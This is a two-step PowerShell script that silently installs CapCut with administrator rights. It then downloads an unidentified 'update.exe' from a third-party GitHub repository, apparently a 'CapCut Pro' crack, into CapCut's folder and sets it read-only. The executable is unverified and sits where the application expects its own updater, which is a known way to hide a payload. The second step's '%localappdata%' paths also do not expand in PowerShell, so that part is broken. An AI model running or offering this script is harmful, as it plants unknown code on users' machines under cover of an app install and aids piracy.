<# 1. download and install capcut#>
$Path = $env:TEMP; $Installer = "capcut.exe"; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest "https://lf16-capcut.faceulv.com/obj/capcutpc-packages-us/packages/CapCut_1_5_1_245_capcutpc_0.exe" -OutFile $Path\$Installer; Start-Process -FilePath $Path\$Installer -Args "/y /silent /install" -Verb RunAs -Wait; Remove-Item $Path\$Installer 
<# 2. insert update.exe to folder#>
$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest "https://raw.githubusercontent.com/StudyWithMe9x/caiCapcutPro/refs/heads/main/update.exe" -OutFile "%localappdata%\CapCut\User Data\Download\update.exe"
Set-ItemProperty -path "%localappdata%\CapCut\User Data\Download\update.exe" -name IsReadOnly $true
